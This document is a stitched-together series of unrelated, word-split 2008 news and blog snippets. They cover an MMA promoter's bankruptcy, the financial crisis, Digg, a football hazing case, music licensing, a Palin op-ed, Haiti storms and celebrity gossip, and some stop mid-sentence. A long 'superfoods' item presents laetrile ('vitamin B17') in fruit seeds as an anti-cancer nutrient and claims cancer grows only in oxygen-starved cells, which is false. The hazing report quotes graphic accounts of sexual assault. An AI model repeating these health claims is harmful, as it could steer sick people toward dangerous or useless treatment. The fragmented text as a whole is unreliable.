ProElite , Inc. , Elite XC ’s Los Angeles - based parent company , plans to file for bankruptcy , said T. Jay Thompson , an Elite XC executive consultant , whose Hawaii - based MMA organization was purchased by ProElite last year .
Elite XC has also informed fighters , office staff and others of immediate layoffs and has canceled fight dates , including a Nov. 8 card in Reno , Thompson said .
In an SEC filing Tuesday , ProElite said that Showtime Networks said it was in violation of a debt covenant because the MMA firm does n’t have enough cash on hand .
ProElite has reported $ 55 million in net losses since January 2007 , according to SEC filings .

Several ProElite executives declined to comment Tuesday .
“ If I had to point fingers why this thing went bad , I ’d have trouble , because I only have two hands , ” said Thompson .
ProElite , which opened two years ago , appointed boxing promoter Gary Shaw as president and he designated his son , Jared Shaw -- known by the nickname " $ kala ” -- a key executive with matchmaking powers .
Gary Shaw , who saw his role change from president to consultant this year , said Tuesday he “ was n’t even a consultant anymore .
I have no comment .
I do n’t know anything about it .
I do n’t know if they ’re done . ”

In another SEC filing , Pro- Elite acknowledged significant deficiencies in how it was operated , including wasteful spending by management and a finding that contracts it entered into were not adequately reviewed .
Thompson said he believes the company ’s fate was sealed when Slice , its biggest star , was knocked out in 14 seconds of the main event of a CBS show Oct.
4 .
Slice was supposed to fight MMA veteran Ken Shamrock .
Instead , a late injury replacement , Seth Petruzelli , was put into the cage .
Petruzelli alleged in a later radio interview that Elite XC promoters told him he ’d earn extra money by fighting a stand - up style that favored Slice ’s strength as a street fighter .
A Florida commission is now investigating that claim .
Meanwhile , instead of gaining an investment by Showtime Networks that ProElite officials had said was vital for its survival , Showtime sent ProElite a default notice for $ 6.3 million last week , according to an SEC filing .
“ ProElite officials have advised us that they will not be able to put on the EliteXC event scheduled for exhibition on Showtime on Nov. 8 , ” Showtime spokesman Chris DiBlasio said in a statement .
“ In view of Showtime ’s leadership role in sports programming , including boxing and mixed martial arts , we intend to explore other opportunities . ”
Advertisement
Thompson railed at what he called a cycle of wasted money by ProElite officials .
Pro Elite would over - staff its fight cards with employees , bringing in “ 35 people who were running around , quite comically ” at shows , he said .
“ It was mind boggling . ”
Earlier this year , in San Jose , a Pro Elite card generated a live gate of $ 1.2 million .
Thompson , with 15 years of fight - promotion experience , said he advised ProElite officials to bring only a few employees north to maximize profits .
Instead , he said , 23 employees worked the event .
A few Elite XC fighters , including champion Jake Shields , Robbie Lawler and Nick Diaz , may land at the top MMA organization , Ultimate Fighting Championship .
But Elite XC stars Slice and female fighter Gina Carano probably will have to look for fights elsewhere .

UFC President Dana
White was not available for comment .
But White ’s spokeswoman said he has previously insisted he was n’t interested in adding Slice to his stable of fighters because he did n’t want to diminish the sport as “ a freak show . ”
Carano ’s publicist did not return messages left for her , but the unbeaten female fighter , who has also performed as “ Crush ” on NBC ’s “ American Gladiators , ” appears headed for a second - tier organization if she continues in MMA .
UFC ’s
White has said that there is n’t enough of a talent pool to start a women ’s fight league .
From day one of Elite XC ’s existence , White predicted a doomed effort .

“ No one in that business has a clue how to do MMA , ” he said in December 2006 .
“ These guys do n’t know the difference between MMA and thumb wrestling . ”

HONG KONG -- Mounting public anger in Asia over soured investments in complex financial products tied to Lehman Brothers Holdings Inc. is fueling a public backlash and calls for tighter regulation .
In Hong Kong , more than 1,000 investors marched on the city 's legislature Wednesday , saying they were conned into buying now - defunct Lehman Brothers derivatives called " minibonds " from local banks that pitched them as safe investments .
Investors were left holding 12.6 billion Hong Kong dollars ( US $ 1.62 billion ) in Lehman minibonds , ...

Thanks to Tina Fey and Sarah Palin , we 're all watching Saturday Night Live again .
And since of us are watching it on our own schedule ( online , DVR ) , it 's about time ' SNL ' crawled out from under the NBC.com and Hulu banners to get its very own online presence .
The news was broken , oddly , via ESPN.com 's Bill Simmons , on a podcast with SNL head writer Seth Meyers ( download here , skip to 22 minute mark ) last week .
B&C moves the story along today , noting that there are still some big question marks hanging over the site , like the extent to which it will dip into the archives , and how they plan to make money off of it .
There 's also come concern that the project wo n't launch in time to take advantage of the pre-election buzz .
Nonetheless , SNL has a lot to gain by really opening up the vault .
Everyone has their favorite SNL clips of yore .
Just yesterday we tried to find their take on the 1992 VP debate ( remember Admiral Stockdale ? ) , but we spent most of the time poking around on YouTube ( there we found clips of the real thing , which was just as funny as SNL's version ) .
More generally , SNL 's sketch - length videos just work for the web .
To some extent , NBC has already figured that out in the last year , at both Hulu and NBC.com
But the most intriguing part about the proposed SNL site , at least the version Meyers describes , would be the chance to watch skits that do n't make it on the air .
We know what you 're thinking :
Too many SNL sketches suck , anyway :
Who wants to see the ones that do n't make the cut ?
But different pieces get cut for different reasons , and it 's entirely possible there 's some great stuff there .
On the Simmons podcast , for instance , Meyers describes a sketch they cut from a show this season in which James Franco played Howard Dean and Fred Armisen played Liberace .
The premise :
The two of them were on a roadtrip .
Does n't that sound a little bit interesting to you ?
B&C quotes an insider concerned that the site will end up like Funny or Die , marginally popular but not a financial home run .
But that misses the point .
An SNL video site does n't need to be a smash hit .
For now and for some time to come , TV will be the moneymaker .
Anything it can get from the web is just an added bonus .
It 's one of those rare situations where the old media side has the more favorable cost structure .
In the meantime , you can still find recent SNL clips on NBC.com , where they compete against bonus scenes from this week 's The Biggest Loser .
Also , since we can't find a video of our favorite all - time clip , here 's a link to the transcript of The Sports Cruise ( ' 94 ) .
Until that 's online , enjoy a more recent favorite : Taco Town .
The camp has been sealed off by police , but The Sunday Telegraph found a hole in the fence .
Inside we found dislike of Italy and fear of the future .
But the teenage mothers suckling infants have grown up in Rome and most speak only Italian .
One camp resident , Najo Adzovic , 37 , said he had deserted the Federal Yugoslav Army and fled to Italy when he was ordered to slaughter 15 Muslims during the Balkan wars .
" I do n't like the police outside our camp or the military presence on our streets , " he said .
" There is some petty crime committed by gipsies because our people are poor , but we are not all criminals . "
Have you looked at Digg lately ?
No , have you really looked at Digg lately ?
If you have , then you will notice for example that there has n’t been a popular story placed there for 4 days on the front page .
Four Days !
What does that mean exactly ?
Back in the day , back in the Trible B Days ( Before Being Banned ) , there were popular stories hitting the front page by the hour !
Now , it takes better than 4 days to get a story to go popular ?
Incredible .
I suspect the reason for this tremendous slow down on Digg is due directly to the Recommendation Engine Digg is so proud of .
I think it ’s a piece of crap and I feel like Kevin Rose et alhas tried to slip a smooth one over on the general internet public here .
I firmly believe that Digg wanted to get rid of top producers to slow the process down on the Digg servers so they could harp the Recommendation Engine .
How stupid .
By the way , have I mentioned I know for a fact there are still people on Digg running scripts ?
Perhaps Digg should look at the Top 50 Diggers again and analize more closely those people .
At any rate , Digg is n’t without warts .
I just wish they would not act as though they are “ holier than thou ” when in fact , I think there are numerous issues with Digg .
Much more now than before all of the banning .
So if you do n’t believe me , you can track how long a story has been submitted before it goes popular .
There is much wrong in Digg land .
The government ’s planned takeover of Fannie Mae and Freddie Mac , expected to be announced as early as this weekend , came together hurriedly after advisers poring over the companies ’ books for the Treasury Department concluded that Freddie ’s accounting methods had overstated its capital cushion , according to regulatory officials briefed on the matter .
The proposal to place both mortgage giants , which own or back $ 5.3 trillion in mortgages , into a government - run conservatorship also grew out of deep concern among foreign investors that the companies ’ debt might not be repaid .
Falling home prices , which are expected to lead to more defaults among the mortgages held or guaranteed by Fannie and Freddie , contributed to the urgency , regulators said .
The details of the deal have not fully emerged , but it appears that investors who own the companies ’ common stock will be virtually wiped out ; preferred shareholders , who have priority over other shareholders , may also wind up with little .
Holders of debt , including many foreign central banks , are expected to receive government backing .
Top executives at both companies will be pushed out , according to those briefed on the plan .
While it is not yet possible to calculate the cost of the government ’s intervention , it could rise into tens of billions of dollars and will probably be among the most expensive rescues ever financed by taxpayers .
The takeover comes on the heels of a rescue of the investment bank Bear Stearns , which was sold to JPMorgan in a deal backed by taxpayer dollars .
Already , the housing crisis has cost investors hundreds of billions of dollars .
The Florida -LSU rivalry never seems to run short on vitriol .
LSU defensive tackle Ricky Jean - Francois upped the ante this week by vowing that his linemates , if the opportunity presents itself , will try to knock Gators quarterback Tim Tebow , last year 's Heisman Trophy winner , out of the game .
" If we get a good shot on [ Tebow ] , we 're going to try our best to take him out of the game , " Jean - Francois said Monday , according to the Orlando Sentinel 's Web site .
" With his size and his heart , it 's hard to get a clean shot .
" I think every lineman wants to get a good hit on a Heisman Trophy winner . "
This year 's clash , at the Swamp in Gainesville , Fla. , on Saturday night , did n't need the extra hype .
It 's the first time in nearly two decades that the past two national champions are to meet during the regular season .
World 's First Chlorophyll Organic Battery Runs on Any Liquid
October 31st , 2008 by Ariel Schwartz
Professor Chungpin Hovering Liao of National Formosa University in Taiwan has created the world ’s first chlorophyll organic battery .
The battery can use any liquid — even urine — to power up .
It does n’t take much time to start juicing the battery , either .
Within 10 seconds of being doused with liquid , the battery starts providing power .
The battery ’s flexibility does come with a catch : it only produces half the power of a conventional battery .
But its power generation capabilities are still formidable — the chlorophyll battery reportedly can store more energy than Japan ’s water - powered fuel cells .
Professor Liao ’s battery also has the low production cost of NT $ 1 to NT $ 2 ( US$.03 to US$.06 ) .
And unlike conventional batteries , it does n’t contain toxic substances .
Stay tuned for more info about the invention — Liao is currently in the process of applying for patents in Taiwan and the United States .

SEPTEMBER 12 --A quartet of boys attending a high school football camp were assaulted last month by broomstick - wielding teammates in a violent hazing ritual that could lead to charges against the assailants and the New Mexico squad 's coaches .
According to police interviews , the attacks were targeted against freshman and sophomore members of the Robertson High School team , which spent four days last month at a pre-season camp in San Miguel County .
During the attacks , each of the younger athletes was pinned to the floor of a cabin and had a broomstick jammed over their shorts into their anus , according to reports prepared by New Mexico State Police investigators .
As seen in the these excerpts , one victim said his attackers ' poked him in the butt four times , ' and ' forced in ' the broomstick on the last attempt .
The boy said he ' cried when they did it , because it hurt . '
Another player said he could ' feel the broom inside him ' and that he was warned during the attack to ' take it now ' or he would ' get it worse later . '
A third victim recalled that after he was assaulted , he was patted on the back by an assailant and told , ' Way to take it like a man . '
In addition to considering charges against several teenage attackers , police are examining whether the football team 's coaches , all of whom resigned this week , ignored or failed to properly report the attacks .
One boy said that , during his attack , a coach walked into the cabin and ' smirked ' at the attackers and ' said something sarcastic ' before leaving .
Another victim said that during a football practice session a second coach warned linemen that if they did not run full speed , 'he would make them hop on their broom sticks . '
Coach Raymond
Woods told police that when he first learned of the hazing , he addressed his squad and asked , ' What kind of guy wants to try to stick a broom stick towards another guy 's butt ? '
Woods resigned this week , days before investigators released their 102 - page file on the mid-August incidents .

This afternoon , the Digital Media Association announced a new agreement with organizations that represent musicians and songwriters that will provide a streamlined licensing procedure for many models of digital music distribution .
The new agreement does n't apply to " download to own " music , but will apply to streaming services , including subscription and ad- supported music ( think Last.fm and SpiralFrog ) .
The agreement has been submitted to the Copyright Royalty Judges for approval .
For the purposes of this agreement , musicians and songwriters were represented by he National Music Publishers ' Association , the Nashville Songwriters Association International , and the Songwriters Guild of America .
They negotiated the deal with the RIAA and the Digital Media Association , which includes industry heavy - hitters like Amazon , Apple , and Microsoft .
But the DiMA also includes a variety of companies that are doing less well under the current system , such as the recently - purchased Napster , and Internet radio services like Live365 and Pandora , which are buckling under the current royalty system .
When we looked at these negotiations back in February the different sides could n't even agree on the basics — what sort of license was required for a given activity , much less the royalties that should be paid .
The new agreement provides for a mechanical royalty ( one for producing a copy of a work ) that 's pegged at 10.5 percent of revenue for interactive and restricted streaming " less any amounts owed for performance royalties . "
This suggests that performance royalties may still apply in some contexts , but that its application wo n't up the cost for those streaming the material .
Those contexts where they do apply appear to be pretty limited , as the announcement states that , " the mechanical licenses issued under its provisions will include all reproduction and distribution rights necessary to provide the licensed limited downloads or interactive streams . "
These prices will apply to restricted downloads , such as those provided by subscription services , as well as interactive streaming services , such as ad - supported music , in which the listener has to perform an action before the music will play .
Broadcasters also get the ability to advertise their services using royalty - free promotional streams , although the conditions that make something " promotional " were n't defined .
Nearly every organization involved issued statements praising the agreement for ensuring that the people that they represent will get their fair share of revenues , but there were a few exceptions to the mutual back - patting .
Jonathan Potter , Executive Director of DiMA , for example , focused on the legal hassles .
" DiMA is particularly pleased with the agreement to end litigation and threats of litigation involving several of our member companies , " he stated , " so that they can focus on building innovative businesses that can effectively fight piracy , the music industry ’s greatest threat . "
For their part , the record labels appear to view this as simply one part of a larger fight to sustain their business .
" This is a first step to establishing fair rates that properly compensate writers for their creative efforts , " stated EMI 's CEO Roger Faxon .
" We 'll continue to work hard to establish a framework that properly reflects the value of songs in all their digital forms . "
Meanwhile , PC Magazine has talked to one of DiMA 's members that was left out of this agreement : Pandora , which operates a noninteractive streaming service .
Although the agreement states that " noninteractive , audio - only streaming " will not require reproduction and distribution licenses from the copyright holders , it fails to put any figure in place for the royalties that these streams require .
A Pandora spokesperson said the company found the agreement an encouraging sign that all sides can talk , but it still does n't solve the problem of the licensing fees that threaten to cripple Internet radio .
Although Internet radio is left out of this agreement and there are clearly going to be further legal tussles among the parties involved , the deal could be significant in terms of providing new ventures with a picture of the sort of business expenses they need to be planning for , and will provide a level playing field for both new and established ventures .
As long as some of the activities are well defined by the language of the agreement , it may let them plan for having reduced legal fees .
Ars has requested a copy of the agreement from the parties involved ; as of publication , none of them have responded .

NEW YORK ( Reuters ) - American International Group Inc , the insurer saved from bankruptcy by a federal bailout , has borrowed $ 90.3 billion from the U.S. Federal Reserve .
Figures released by the Fed late on Thursday showed that as of Wednesday , AIG had drawn down $ 3 billion more than a week earlier .
AIG has borrowed $ 72.3 billion , or 85 percent , of an initial $ 85 billion bridge loan extended by the government on September 16 .
In addition , it has drawn $ 18 billion under a subsequent $ 37.8 billion securities lending agreement the government agreed to extend earlier this month .
The company is scrambling to sell off parts of its business to repay the bridge loan , which carries hefty interest and fees .
In total , the government has put about $ 123 billion at AIG ’s disposal .
AIG Chief Executive Edward Liddy earlier this week said on a PBS television broadcast said he hoped but was not certain that $ 123 billion would be enough .
Liddy said AIG was working to “ stop the bleeding ” in a financial products unit that is the source of the company ’s $ 25 billion in mortgage losses over the past three quarters -- losses that have crippled the company .
AIG shares were down sharply in early trade on Friday as broader markets fell over fears of a global recession .
The stock was trading at $ 1.87 , a drop of more than 11 percent .
Please tell me how you would rate the honesty and ethical standards of people in these different fields -- very high , high , average , low or very low ?
How about -- [ RANDOM ORDER ] ?
We Don't Want Another Agnew
Folks in the McCain camp are engaged in one giant pity party over the way in which the media are trying to scrutinize their hero , GOP vice presidential nominee Sarah Palin .
Let ’s hope her defenders do n’t drown in their crocodile tears .
A more counterfeit show of woe would be hard to find .
With Election
Day only eight weeks away , Sarah Palin is the least vetted member of a presidential ticket in recent history .
The McCain team , of course , wants to keep it that way -- since the image they ’re created of Palin as the reincarnation of Ronald Reagan and Betty Crocker seems to be a winner .
The press ca n’t let that happen .
We fell for that trick once before , and America has n’t experienced a similar political nightmare since 1973 .
Lest we forget , another Republican presidential nominee pulled the same stunt that John McCain is trying to perform this year .
McCain ’s role model ?
Richard Nixon .
To recall : A stunned America learned in 1968 that Nixon had asked a politically obscure Republican governor , Spiro T. Agnew , to join him on the ticket .
As with the impact of McCain ’s out - of - nowhere announcement of Palin , some of the 1968 Republican convention delegates were heard to ask “ Spiro who ? ”
At the time , Agnew -- like Palin -- had been governor ( of Maryland ) for only two years .
Also like Palin , Agnew ’s political career began at the local level , when he was elected Baltimore County executive in a campaign in which he was billed as a reformer .
He went from county exec to vice president in six years .
One more similarity to McCain 's surprise choice : Nixon knew very little about the nature of Agnew ’s service as county executive and governor .
Nixon and the rest of the country did n’t learn about the vice president ’s previous life until word leaked out that Agnew was under investigation by the U.S. attorney ’s office in Baltimore on charges of accepting bribes during his time as governor .
The government nailed him .
Vice President Agnew was allowed to plead no contest to charges of money laundering and tax evasion in exchange for his resignation in 1973 , payment of a fine and three years ' probation .
Spiro Agnew left office in disgrace .
That he even reached the nation ’s second - highest office and ended up a heartbeat away from the presidency is because Richard Nixon did n’t do his job .
But Nixon was n’t alone .
The press failed the American people , too .
To look the other way this year because the McCain camp is cynically making us out to be the enemy is to shrink from our duty .
Of course the lives of Sarah Palin ’s children are none of our business .
Palin 's public service , however , as a council member , as mayor and as governor , is very much the American voter 's business .
Thus far , all we have about her from the McCain camp is fluff .
That ’s to be expected .
But Americans who go to the polls in only a few weeks need to know more about the character and integrity of Palin ’s service , her use -- or misuse -- of power and the public purse , and her ability and capacity to handle a job on the scale of the vice presidency .
Agnew was a fool and an idler .
" No assassin in his right mind would kill me , " Nixon is said to have joked to his aide John Ehrlichman , according to Agnew 's obituary in the New York Times .
“ They know if they did that they would wind up with Agnew . ”
I ’d say that judgment came about four years too late .
We ca n’t make that mistake again .

What you have in your mind when you go to the grocery store will pretty much determine whether you live a long life of vibrant good health with feelings of well being , or a shortened life riddled with obesity and degenerative disease .
Will you be a person with energy and enthusiasm for life , a person who others seek out and want to be around ?
Or will be you a lifeless , cranky and unattractive person ?
The answer largely depends on what you choose to put in your grocery cart .
If you have chosen to be the person with the vibrant health , you will head to the store with superfoods in mind .
If you are looking to treat yourself , there is no better way to do it than with a selection of the best nature has to offer .
And if you are budget minded , there is no better value for your money in the whole store than buying superfoods , even though they are rarely on sale .
Superfoods are those foods containing compounds so powerful that they have a profound effect on your health profile .
It 's been said that 50 to 70 percent of suffering could be eliminated by choosing a diet made up primarily of superfoods .
If you already have one of the degenerative diseases such as cancer , diabetes , hypertension , or heart disease , the impact on you from choosing a diet composed of superfoods will be nothing short of astounding .
With a few exceptions , superfoods are the kind of foods you can just pick up and eat .
They do n't require extensive preparation or cooking .
They are food the way nature intended for you to eat food , and are perfect for a family on the go .
It is difficult to choose a list of superfoods .
Nature has provided her children with a bounteous table of possibilities .
Here are just some of the superfoods that stand out as the best of the best .
You can find these at almost any traditional grocery store : 
Remember the saying " An apple a day keeps the doctor away " ?
Apples normalize cholesterol levels , and reduce risk of stroke , cancer , and type 2 diabetes .
A recent study showed that apple eaters had a decreased likelihood of having metabolic syndrome when compared to those who do n't eat apples .
Metabolic syndrome was defined as having three or more of the associated symptoms related to cardiovascular risk , including elevated blood pressure , increased waist size and elevated C - reactive protein levels .
The seeds of apples contain good amounts of vitamin B 17 , otherwise known as laetrile , and should be eaten right along with the fruit .
New research suggests that apples protect from colon cancer and slow the growth of precancerous and tumor cells .
Apples have been shown to improve lung function and lower risk for respiratory disease .
They cut smokers ' risk of chronic obstructive pulmonary disease ( COPD ) in half .
They have also been shown to protect from harmful plaque build - up by slowing the cholesterol oxidation process .
Mental dexterity and age - related memory loss is slowed by apple consumption , as is bone loss .
Apples are one of the best food sources of boron , a mineral critical to bone health .
They also contain high amounts of quercetin , one of nature 's most powerful anti-inflammatories . 
These tiny powerhouses of nutrition protect the body against the effects of free radicals that can damage cell membranes and DNA resulting in the chronic diseases associated with the aging process .
Along with antioxidants such as Vitamins C and E , blueberries , strawberries , blackberries , raspberries and bilberries contain anthocyanins and phenolics that display antioxidant properties .
Their oxygen radical absorbance capacity ( ORAC ) is among the highest found among fruits and vegetables .
In a study , mice were fed the equivalent of a human eating one cup of blueberries a day , and were then run through a series of motor skills tests .
The blueberry - fed mice performed better than their control group counterparts in motor behavioral learning and memory , and displayed an increase in exploratory behavior .
An examination of their brains showed decreased oxidative stress and better retention of signal - transmitting neurons compared to the controls .
When a similar test was performed on humans eating a cup of blueberries a day , they performed 5 to 6 percent better on motor skills tests than the controls .
Berries are a good source of vitamins , minerals and dietary fiber .
They are high in vitamin D , folic acid , and manganese .
They also contain cancer fighting carotenoids , tannins , ellagitannins and gallic acid , as well as quercetin and eye protective lutein .
And just as with apples , the seeds of berries are a good source of the anti-cancer vitamin B 17 , or laetrile . 
This is a family of vegetables that includes broccoli , cabbage , kale , radish , Brussels sprouts , cauliflower , collard greens , kohlrabi , mustard , rutabaga , turnips , bok choy , Chinese cabbage , arugula , and watercress .
All these are rich sources of glucosinolates , sulfur - containing compounds that when broken down result in the formation of biologically active compounds such as indoles and isothiocyanates .
These products of glucosinolates prevent and fight cancer by enhancing the elimination of carcinogens before they can damage DNA , and by altering cell signaling pathways in a manner that helps prevent normal cells from being transformed into cancerous cells .
A wealth of recent studies has documented diindolymethane ( DIM ) as one of the most effective phytonutrients in the prevention and treatment of breast , prostate , colon and pancreatic cancers .
DIM is a compound found in cruciferous vegetables that regulates hormone balance and cell behavior .
DIM is unique among all phytonutrients with regard to its ability to modify estrogen metabolism in the direction of greater 2 - hydroxy estrogen production .
Improper metabolism of estrogen allows for oxidation , damage to DNA , and cancer promotion to take place .
DIM prevents the conversion of estradiol to estrone in both men and women . 
Whenever Popeye needed some extra strength and vitality he grabbed a can of spinach .
That 's because spinach is an excellent source of energy boosting iron , an integral component of hemoglobin which transports oxygen to all body cells .
Cancer is only able to grow in cells where the oxygen level is deficient .
Spinach also contains at least 13 flavonoid compounds that act as antioxidants and anti-cancer agents , particularly for stomach - , breast - , and skin cancer .
A carotenoid called neoxanthin induces prostate cancer cells to self - destruct .
Spinach is an excellent source of vitamin K , essential to bone health , as well a providing ample amounts of calcium and magnesium .
It also boosts brain function , and increases learning capacity and motor skills .
Results from the Chicago Health and Aging Project suggest that daily eating of spinach along with cruciferous vegetables reduces cognitive decline by 40 % .
This amazing result was credited to the substantial amounts of full range vitamin E in the vegetables .
Gastrointestinal health , good eyesight , and low levels of inflammation are also promoted by the nutrients in spinach , such as vitamin C , beta - carotene , folate , riboflavin , and vitamin A .
These nutrients also protect against cardiovascular disease .
These vegetables provide soluble fiber that passes through the digestive tract grabbing and trapping bile that contains cholesterol , and removing it from the body .
Eating a cup of cooked beans a day reduces risk of heart attack by almost 40 % .
This soluble fiber also creates more insulin receptor sites for insulin molecules to connect to , allowing insulin to get to the cells that need it , instead of floating freely through the bloodstream .
Anyone with insulin resistance may benefit from this increase in receptor sites .
In addition to good amounts of the usual nutrients , beans and lentils are one of the primary sources of phytic acid , also known as IP6 .
This nutrient has been shown to have significant inhibitory effects against a variety of primary tumors due to its ability to promote appropriate programmed cell death .
Phytic acid is even effective against the deadly pancreatic cancer .
It helps normalize cell physiology , enhance natural killer ( NK ) cells , increase tumor suppressor P53 gene activity , inhibit inflammation , and inhibit angiogenesis which is the process by which tumors set up their own blood supply . 
Eating these foods five or more times a week reduces your risk of heart attack by a whopping 60 % .
Research shows that people who eat nuts are generally thinner , have lower levels of LDL cholesterol and better bones .
They are also at a lower risk for cancer and inflammation .
Nuts are nutrient packed .
They have a fatty acid profile that favorably affects blood lipids and lipoproteins .
They contain antioxidant polyphenols that prevent oxidative stress , a causative factor for neurodegenerative and cardiovascular disease .
And they provide high amounts of magnesium , boron , zinc -- minerals essential for bone health .
Nuts and seeds are rich sources of the antioxidant mineral manganese , as well as vitamin E , folic acid , copper , and the amino acid arginine which is a precursor of human growth hormone .
Some nuts and seeds contain tryptophan , a stimulator of serotonin in the brain that alleviates depression and boosts relaxation .
They are also high in phytochemicals that protect against cancer and other chronic diseases .
This superfood really needs its own article to list all its health benefits .
Eating just two servings of wild caught salmon a week provides as much omega - 3 essential fatty acids as taking daily fish oil supplements .
Omega - 3 fats help prevent erratic heart rhythms , make blood less likely to clot inside arteries , improve the ratio of cholesterol , and prevent cholesterol from becoming damaged and thereby preventing clogged arteries .
It has anti-inflammatory properties on a par with prescription drugs but without the side effects , and is also able to lower high levels of triglycerides .
It is a tremendous source of the B vitamins including B12 that normalize blood pressure and promote heart health .
Eating salmon as little as 1 to 3 times per month offers protection against stroke caused by lack of blood supply to the brain .
Eating it 4 times a month reduces the risk of deep vein thrombosis by 30 - 45 % , and the risk for atherosclerosis .
Salmon benefits men and women by improving insulin response and lessening the threat of obesity .
The omega - 3 fatty acid EPA stimulates the secretion of leptin , a hormone that helps regulate food intake , body weight and metabolism , and is expressed primarily by adipocytes ( fat cells ) .
Salmon is the main ingredient in Dr. Nicholas Perricone 's prescription for beautiful skin as outlined in his recent book .
The anti-inflammatory effects of eating several salmon meals each week result in tremendous anti-aging effects on the skin by reducing wrinkles , increasing tone , and improving the underlying tissue .
The omega - 3 fatty acids in salmon have been shown to protect against many forms of cancer including colorectal and prostate which are stimulated by inflammation .
Omega - 3 fats stimulate the creation of anti-inflammatory prostaglandins .
These fats also offer significant protection against both early and late age - related macular degeneration .
The risk for and incidence of dry eye syndrome is lessened by omega - 3's .
Another agent of the anti-inflammatory effects of salmon is astaxanthin , the red pigment that gives salmon its color .
Astaxanthin protects skin against sunburn and possibly skin cancer .
Mood and clarity of thought are improved by salmon consumption .
The human brain is more than 60 % structural fat .
For brain cells to function properly , this fat needs to be primarily omega - 3 such as found in salmon .
Studies suggest a connection between increased rates of depression and decreased omega - 3 consumption , and between attention deficit hyperactivity disorder ( ADHD ) and decreased omega - 3's .
Researchers have also found a robust correlational relationship between greater fish consumption and lower rates of bipolar disorder .
Another study found a high correlation between adolescent hostility and low levels of fish consumption .
Better brain functioning in older adults can be promoted by the consumption of salmon .
People who have a higher blood level of omega - 3 were found to have a 47 % lower risk of developing dementia . 
A four ounce serving of turkey provides 65.1 % of the daily value for protein , the building blocks for the structure of the human body .
It 's also a super source for the trace mineral selenium , an essential component of several major metabolic pathways including thyroid hormone metabolism , antioxidant defense systems , and immune function .
There is a documented strong inverse correlation between selenium intake and cancer .
Turkey is also a good source of the cancer - protective B vitamins .
Components of DNA require niacin .
A deficiency of niacin and other B complex vitamins has been directly linked to DNA damage .
B vitamins are important for energy production and aid in the regulation of blood sugar levels .
Vitamin B6 is essential for the processing of carbohydrates .
B6 and B12 levels must be adequate for methylation , a process resulting in the formation of a wide variety of very important active molecules .
Turkey is an excellent source of the amino acid L - tryptophan .
This amino acid can be metabolized into serotonin and melatonin , neurotransmitters that exert a calming effect and regulate sleep .

Gonaives has been devastated by successive storms Haiti's Prime Minister Michele Pierre - Louis has said that a series of storms may have left as many as one million Haitians without a home .
Ms Pierre - Louis , who has called on the international community to more assistance , said part of the city of Gonaives might have to be moved .
She said the whole country has been devastated by four storms which struck in just over three weeks .
The problem was too great for Haiti to deal with on its own , she added .
RECENT MAJOR STORMS Hurricane Ike : September Tropical Storm Hanna : September Hurricane Gustav : August , September Tropical Storm Fay : August " We need major support and it is time for the world to understand that , " she said .
" We 've suffered too much in this country . "
Strong winds and torrential rains over the past month have battered Haiti 's already fragile infrastructure and left more than 550 people dead .
Ms Pierre - Louis told the BBC that part of the city of Gonaives , which was almost completely destroyed by the hurricanes , may now have to be built elsewhere .
She also admitted that unless victims of the storms receive more help , rising discontent could force her from office .

Craigslist is a great place to sell that beat - up sofa or ( for the supervillains among us ) recruit your next batch of henchmen .
Now , thanks to a Monroe , WA man , " bank robbery decoys " has joined the list of creative uses of the grassroots classifieds service .
According to The Seattle Times , a Craigslist ad was placed last week , offering road construction work at $ 28.50 per hour in Monroe , WA , a city northeast of Seattle .
About a dozen men replied to the ad , and all received instructions to show up outside a Bank of America wearing a yellow vest , safety goggles , a respirator mask , and a blue shirt .
As the men gathered outside the bank within the proper attire , however , another man wearing the same getup used pepper spray on a guard transporting cash from an armored truck into the bank .
The suspect grabbed the duffel bag , ran 100 yards to Wood Creek , and made his getaway ( floataway ? ) on what police believe to be an inner tube .
Seattle FBI spokeswoman Robbie Burroughs told the Times that armored car robberies are " quite uncommon , " and that she 's never heard of an inner tube serving as a getaway vehicle .
Strange ads on Craigslist are anything but uncommon these days , though , and some of them have landed the company in hot water .
In November 2006 , and again in March 2008 , Craigslist was hit by lawsuits for discriminatory ads that specified things like " no uglies " in postings for an apartment roommate .
In April 2007 , another ad told viewers to take whatever they want from a house .
Turns out the ad was probably the result of a family feud , allegedly placed by the evicted sister of Laurie Raye , who actually owned the house .
Raye never blamed Craigslist for what happened .
The lawsuits were eventually dismissed on the grounds that Craigslist is a service provider , not a publisher , and therefore not responsible for the content of the ads .
Indeed , plenty more user - favorited ads in the Craigslist Best Of section could be walking various lines between legitimacy and legality .
As in past cases , though , Craigslist will almost certainly be exempt from any liability in this bank robbery case .
If anything , the suspect at least earns points for creativity and succeeding at what is possibly the slowest getaway ever .
Michelle Obama made her first appearance on The Daily Show ( see part one of the interview here ) , and exemplified the Obama strategy of taking the high road , being gracious and focusing on what needs to be done rather than attacking their opponent .
Any wonder why Obama 's polling numbers are rising and McCain 's are dropping ?

At the opening ceremony of the 29th session of the Intergovernmental Panel on Climate Change ( IPCC ) , and its 20th anniversary in Geneva , Switzerland , the head of the U.N. made it known that he believed the next American president must show greater leadership than previous administrations in fighting climate change .
From our perspective , that should n’t be too hard ; all he ’ll have to do is personally change a fluorescent light bulb in the Oval Office and he ’ll be doing better than Bush .
“ All the countries in the international community are looking for more and greater leadership from the United States , ” said U.N. Secretary - General Ban Ki-moon .
And though Ban praised U.S. President George W. Bush for the role that he has played , calling it an “ important role ” in discussing how countries can minimize their greenhouse gas emissions , he was not altogether pleased .
Ban said that the United States has not done enough to turn talk in to action , especially considering its position as one of the planets greatest producers of greenhouse gasses .
“ I sincerely hope the next US administration will demonstrate a greater leadership role , ” Mr Ban said on the sidelines of the 20th anniversary ceremony .
“ Climate change is no longer just a phenomenon , ” Ban said .
“ It has developed into a full - scale crisis which threatens broad areas of human endeavour , such as the race to reach and maintain the ( UN’s ) Millennium Development Goals . ”
“ I think that , whoever may be elected as the president of the United States may be in a better position to lead this process , ” Ban added .

US More Concerned about Local than Global
Samantha Ronson has revealed her engagement to Lindsay Lohan , and that the couple are planning to marry by the end of the year .
... the ' Mean Girls ' star was seen sporting a ' committment ' ring worth $ 22,000 from Samantha Ronson .
Anzeige
Samantha , 31 , who gave Lindsay a ' commitment ' ring worth $ 22,000 earlier this year , let slip her happy news while DJing at the exclusive Hollywood hotel Chateau Marmont .
She said : “ By the end of this year , my love will be Mrs. Ronson !
Tonight shows the power of a woman – to underestimate that is to underestimate the world . ”
Lindsay , 22 , has made no secret of her love for Samantha – the sister of music producer Mark Ronson – in recent weeks , and dedicated Ray LaMontagne 's touching ballad ' Trouble ' to her on her blog .
